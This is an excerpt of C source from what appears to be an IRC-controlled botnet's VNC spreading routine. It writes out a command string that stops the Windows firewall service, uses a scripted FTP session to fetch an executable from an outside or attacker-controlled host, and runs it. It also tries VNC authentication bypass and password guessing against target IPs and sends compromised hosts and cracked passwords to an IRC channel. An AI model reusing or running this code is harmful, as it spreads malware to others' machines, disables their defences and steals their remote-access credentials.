...
void VNCPassCheck(exparam_s exparam) 
{
	...
	if (exparam.cftp) 
		_snprintf(FTPLine, sizeof(FTPLine), 
			"cmd /c net stop SharedAccess &echo open %s %d >> ij &echo user %s %s >> ij &echo binary >> ij &echo get %s >> ij &echo bye >> ij &ftp -n -v -s:ij &del ij &%s &net start SharedAccess &exit",	
			cfg_cftp_host, cfg_cftp_port, cfg_cftp_user, cfg_cftp_pass, cfg_cftp_file, cfg_cftp_file);
	else
	{
		char Fname[MAX_PATH];
		_snprintf(Fname, sizeof(Fname), "%s.exe", GenerateRandomLetters(2));
		_snprintf(FTPLine, sizeof(FTPLine), 
			"cmd /c net stop SharedAccess &echo open %s %d >> ij &echo user %s %s >> ij &echo get %s >> ij &echo bye >> ij &ftp -n -v -s:ij &del ij &%s &net start SharedAccess &exit",
			exparam.myip, exparam.ftp_port, exparam.ftp_user, exparam.ftp_pass, Fname, Fname);
	}
	...
	while (1)
	{
		...
		thataddr.sin_addr.s_addr = exparam.ip;
		thataddr.sin_family = AF_INET;
		thataddr.sin_port = htons(exparam.port);	
					...
					{		
						...
						{							
							...
							_snprintf(SendBuf, sizeof(SendBuf), "VNC%d.%d %s: %s - [AuthBypass]", 
								m_majorVersion, m_minorVersion, m_desktopName, exparam.ip_char);
							Spreader_IRC_Send(exparam.ircsock, MSG_PRIVMSG, SendBuf, cfg_vncchan);
						...
						{		
							...
							if (WriteExact(m_sock, (char *) useShared, sz_rfbClientInitMsg) && 
								...
								_snprintf(SendBuf, sizeof(SendBuf), "VNC%d.%d %s: %s - %s", 
									m_majorVersion, m_minorVersion, m_desktopName, exparam.ip_char, passwd);
								Spreader_IRC_Send(exparam.ircsock, MSG_PRIVMSG, SendBuf, cfg_vncchan);
								memset(SendBuf, 0, sizeof(SendBuf));
